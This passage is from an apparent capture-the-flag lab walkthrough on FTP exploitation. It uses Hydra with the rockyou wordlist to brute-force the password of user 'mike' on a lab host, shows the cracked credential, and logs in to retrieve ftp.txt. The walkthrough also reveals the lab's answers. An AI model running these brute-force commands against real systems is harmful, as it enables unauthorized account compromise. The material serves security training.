 mike

Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...

## Exploiting FTP

**Types of FTP Exploit**

Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by [JSCape](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP) demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.



**Method Breakdown**

So, from our enumeration stage, we know:

    - There is an FTP server running on this machine  

    - We have a possible username  

Using this information, let's try and **bruteforce** the password of the FTP Server.

**Hydra**

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra is already installed on the AttackBox, however, if you need it on your own attacking machine, you can find the GitHub repository [here](https://github.com/vanhauser-thc/thc-hydra).  

The syntax for the command we're going to use to find the passwords is this:

**"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"**

Let's break it down:

SECTION             FUNCTION  
  
hydra                   Runs the hydra tool  
  
-t 4                    Number of parallel connections per target  
  
-l [user]               Points to the user who's account you're trying to compromise  
  
-P [path to dictionary] Points to the file containing the list of possible passwords  
  
-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt  
  
[machine IP]            The IP address of the target machine  
  
ftp / protocol          Sets the protocol

Let's crack some passwords!  

Answer the questions below

### What is the password for the user "mike"?  

```
┌──(kali㉿vbox)-[~]
└─$ hydra -l mike -P /usr/share/wordlists/rockyou.txt ftp://10.10.14.239 -t 40
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-19 16:14:17
[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344399 login tries (l:1/p:14344399), ~358610 tries per task
[DATA] attacking ftp://10.10.14.239:21/
[21][ftp] host: 10.10.14.239   login: mike   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-19 16:14:50
                                                                                                     
```


Bingo! Now, let's connect to the FTP server as this user using **"ftp [IP]"** and entering the credentials when prompted  

Correct Answer

### What is ftp.txt?

```
┌──(kali㉿vbox)-[~]
└─$ ftp 10.10.14.239 
Connected to 10.10.14.239.
220 Welcome to the administrator FTP service.
Name (10.10.14.239:kali): mike
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46282|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
226 Directory send OK.
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
229 Entering Extended Passive Mode (|||47991|)
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
100% |********************************************************|    26      564.23 KiB/s    00:00 ETA
226 Transfer complete.
26 bytes received in 00:00 (0.12 KiB/s)
ftp> 
```